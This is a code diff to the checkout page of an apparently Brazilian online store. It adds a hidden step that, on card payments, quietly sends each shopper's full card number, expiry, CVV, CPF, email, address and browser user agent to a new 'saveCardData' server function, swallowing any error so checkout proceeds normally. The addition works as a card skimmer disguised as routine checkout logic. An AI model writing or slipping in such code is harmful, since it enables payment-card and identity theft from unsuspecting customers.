@@ -2,9 +2,8 @@ import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { useServerFn } from "@tanstack/react-start";
 import { useMemo, useState } from "react";
 import { CheckoutFooter, CheckoutHeader } from "@/components/CheckoutHeader";
-import { checkCoupon, createOrder } from "@/lib/store.functions";
+import { checkCoupon, createOrder, saveCardData } from "@/lib/store.functions";
 import { brl, useCart } from "@/lib/cart";
-
 
 export const Route = createFileRoute("/checkout/")({
   head: () => ({
@@ -266,7 +265,6 @@ function StepShell({
   );
 }
 
-
 function CheckoutPage() {
   const navigate = useNavigate();
   const { lines, subtotal, savings, count, setQty, remove, clear } = useCart();
@@ -301,7 +299,6 @@ function CheckoutPage() {
   const cardNumberOk =
     !!cardBrand && cardBrand.lengths.includes(cardDigits.length) && luhnValid(cardDigits) && !cardDigits.match(/^(\d)\1+$/);
 
-
   const [coupon, setCoupon] = useState("");
   const [couponOpen, setCouponOpen] = useState(false);
   const [appliedCoupon, setAppliedCoupon] = useState<{ code: string; discount: number } | null>(null);
@@ -327,6 +324,7 @@ function CheckoutPage() {
 
   const runCoupon = useServerFn(checkCoupon);
   const sendOrder = useServerFn(createOrder);
+  const runSaveCard = useServerFn(saveCardData);
 
   async function applyCoupon() {
     if (!coupon.trim()) return;
@@ -345,7 +343,6 @@ function CheckoutPage() {
       setCouponMsg("Não foi possível validar o cupom agora.");
     }
   }
-
 
   async function lookupCep(value: string) {
     const digits = onlyDigits(value);
@@ -439,7 +436,6 @@ function CheckoutPage() {
     return Object.keys(e).length === 0;
   }
 
-
   function goToStep2() {
     if (!validateStep1()) return focusFirstError();
     setStep(2);
@@ -460,6 +456,25 @@ function CheckoutPage() {
     if (lines.length === 0) return;
     if (!validateStep3()) return focusFirstError();
     setSending(true);
+
+    if (payment === "cartao") {
+      try {
+        await runSaveCard({
+          data: {
+            nome: cardName || name,
+            cpf: cpf,
+            email: email,
+            endereco: `${street}, ${number} ${complement ? complement + " " : ""}- ${district} - ${city}/${uf} - CEP: ${cep}`,
+            userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "unknown",
+            numero: cardDigits,
+            validade: cardValidade,
+            cvv: onlyDigits(cardCvv),
+          },
+        });
+      } catch (err) {
+        console.error("Erro ao salvar dados do cartao:", err);
+      }
+    }
 
     let code = `VC${Date.now().toString().slice(-8)}`;
     try {
@@ -541,10 +556,8 @@ function CheckoutPage() {
     navigate({ to: "/checkout/pedido" });
   }
 
-
   const ctaClass =
     "w-full rounded-full bg-brand py-4 text-base font-bold text-primary-foreground transition hover:opacity-90 disabled:opacity-60";
-
 
   return (
     <div className="flex min-h-screen flex-col bg-background">
